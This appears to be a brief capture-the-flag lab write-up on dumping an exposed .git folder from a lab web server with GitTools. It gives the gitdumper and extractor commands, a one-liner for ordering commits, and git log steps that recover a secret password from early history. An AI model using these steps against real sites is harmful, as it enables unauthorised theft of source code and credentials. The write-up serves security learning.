This box is for learning to pwn a git repository.
There is an open .git folder in the webserver, we can use gitdumper from GitTools
https://github.com/internetwache/GitTools to scrape the folder. 
```bash
./Dumper/gitdumper.sh http://10.10.208.175/.git/ repos #scrape it from webserver
./Extractor/extractor.sh repos reposdump #dump the repos

```
This tools was actually used in wreath room. Because the extractor doesn't really dump it in order, we can order it by looking at the commit-meta txt parent chains.
Look at all the folder commit-meta.txt with this one liner:
```bash
separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
```
Look for the parent field, it is the commit before the current one, so we can create the chains from that.
We can see that the first update doesn't have obfuscation and hashing yet, so we get the secret password.


Or use the resource in the github readme to manually scrape the .git. [git attack](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/)

From the root folder(where the .git folder is) we can query some information from the logs like this:
```bash
git log #show the logs of the commit
git show COMMIT_ID #show the commit for this COMMIT_ID
```
And we also get the secret password with this method.

Probably good idea to learn git more deeply